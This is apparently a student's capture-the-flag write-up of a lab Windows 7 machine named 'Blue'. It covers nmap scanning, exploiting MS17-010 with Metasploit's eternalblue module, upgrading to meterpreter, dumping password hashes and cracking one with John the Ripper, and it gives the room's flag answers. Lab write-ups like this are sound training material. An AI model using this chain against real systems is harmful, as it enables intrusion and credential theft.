# Blue

### Recon
- How many ports are open with a port number under 1000?<br />
First nmap scan: <br />

      $ nmap 10.10.8.108                          
      Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 08:39 EDT
      Nmap scan report for 10.10.8.108
      Host is up (0.049s latency).
      Not shown: 991 closed tcp ports (conn-refused)
      PORT      STATE SERVICE
      135/tcp   open  msrpc
      139/tcp   open  netbios-ssn
      445/tcp   open  microsoft-ds
      3389/tcp  open  ms-wbt-server
      49152/tcp open  unknown
      49153/tcp open  unknown
      49154/tcp open  unknown
      49158/tcp open  unknown
      49159/tcp open  unknown

      Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds
Open ports under 1000 are `3`.
- What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067) <br />
A more accurate scan: <br />

      nmap -p 0-1000 -sV -sC 10.10.8.108                                                                                  
      Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 08:42 EDT
      Nmap scan report for 10.10.8.108
      Host is up (0.058s latency).
      Not shown: 998 closed tcp ports (conn-refused)
      PORT    STATE SERVICE      VERSION
      135/tcp open  msrpc        Microsoft Windows RPC
      139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
      445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
      Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
      
      Host script results:
      | smb-os-discovery: 
      |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
      |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
      |   Computer name: Jon-PC
      |   NetBIOS computer name: JON-PC\x00
      |   Workgroup: WORKGROUP\x00
      |_  System time: 2024-09-02T06:42:21-05:00
      | smb2-security-mode: 
      |   2:1:0: 
      |_    Message signing enabled but not required
      |_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:95:7f:42:ac:55 (unknown)
      | smb2-time: 
      |   date: 2024-09-02T11:42:21
      |_  start_date: 2024-09-02T11:30:29
      | smb-security-mode: 
      |   account_used: guest
      |   authentication_level: user
      |   challenge_response: supported
      |_  message_signing: disabled (dangerous, but default)
      |_clock-skew: mean: 39m28s, deviation: 2h53m12s, median: -1h00m32s
      
      Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
      Nmap done: 1 IP address (1 host up) scanned in 13.27 seconds
So, after reaserching "Windows 7 Professional 7601 Service Pack 1 microsoft-ds", I found out that this SMB version is vulnerable to `MS17-010`, a.k.a. `EternalBlue`.

### Gain Access
- Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
Open msfconsole and `use windows/smb/ms17_010_eternalblue` --> `set lhost your_IP` --> `set rhosts target_IP` --> `exploit`: <br />
- Show options and set the one required value. What is the name of this value? (All caps for submission) `RHOSTS`

### Escalate
- If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) `post/multi/manage/shell_to_meterpreter`
- Select this (use MODULE_PATH). Show options, what option are we required to change? `SESSION`

### Cracking
- Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? <br />
![image](https://github.com/user-attachments/assets/85690b30-ca83-4967-9232-b90e9e5c85e2) <br />
`Jon`
- Copy this password hash to a file and research how to crack it. What is the cracked password?  <br />
To crack the password I'm going to use John the Ripper. Copy the line relative to "Jon" in a txt file. In windows password hashes are stored in NTLM format, so the final command is: `john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlmhash.txt`. <br />
![image](https://github.com/user-attachments/assets/484d04fa-5f6e-4bb0-8a13-0cc01923d781)<br />
`alqfna22`

### Find flags!
- Flag1? This flag can be found at the system root. <br />
Move to `C:\` and run `cat flag1.txt`: `flag{access_the_machine}`
- Flag2? This flag can be found at the location where passwords are stored within Windows. <br />
Passwords are store in the SAM(Security Account Manager) directory, which is located at `C:\Windows\System32\config`. The flag is: `flag{sam_database_elevated_access}`
- flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. <br />
I honestly didn't know where to look at, since this is my first windows machine. So I run `search -f flag3.txt` to find the flag, which was in c:\Users\Jon\Documents\flag3.txt. The flag is: `flag{admin_documents_can_be_valuable}`. I was actually looking for some sort of administrator account but actually Jon is an administrator, my bad.
